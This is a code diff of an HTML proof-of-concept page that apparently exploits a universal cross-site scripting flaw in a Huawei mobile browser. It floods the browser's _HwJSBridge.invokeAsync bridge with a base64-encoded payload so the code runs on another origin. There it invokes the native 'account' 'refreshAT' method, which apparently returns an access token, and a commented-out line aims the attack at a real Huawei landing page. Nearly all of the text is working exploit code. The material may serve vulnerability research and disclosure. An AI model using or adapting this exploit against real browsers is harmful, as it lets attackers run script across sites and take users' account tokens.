@@ -5,15 +5,25 @@
     <meta charset="UTF-8">
     <title>HW</title>
     <script type="text/javascript">
+
+        function base64Encode(str) {
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        function base64Decode(str) {
+            return decodeURIComponent(escape(atob(str)));
+        }
+
         function triggerPoc(url, code) {
             const currUrl = location.href;
             const payload = `
         if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
             window.__cloudx_called = true;
+            console.log('cloudx uxss');
             ${code}
         }
     `;
-            const base64 = btoa(payload);
+            const base64 = base64Encode(payload);
             for (let i = 0; i < 4000; i++) {
                 setTimeout(function () {
                     if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
@@ -34,15 +44,11 @@
             location.href = url;
         }
 
-        code = '                setTimeout(() => {\n' +
-            '                    window.hwbr = window.hwbr || {};\n' +
-            '                    window.hwbr.callbackFromNative = function (a, b, c, d, e) {\n' +
-            '                        if (a == \'callbackId\') {\n' +
-            '                            alert(\'b:\' + b + \'\\nc:\' + c + \'\\nd:\' + d.toString())\n' +
-            '                        }\n' +
-            '                    };\n' +
-            '                    window._hwbrNative.invoke(\'account\', \'refreshAT\', \'callbackId\', \'["123", "123"]\', 10);\n' +
-            '                }, 500);'
+        code = `
+        window.hwbr = window.hwbr || {};
+        window.hwbr.callbackFromNative = function(a, b, c, d, e){if(a=='zdccctest') {alert(d.toString())}};
+        window._hwbrNative.invoke('account', 'refreshAT', 'zdccctest', '["123", "123"]', 10);
+        `
 
         // triggerPoc('https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/', code)
     </script>
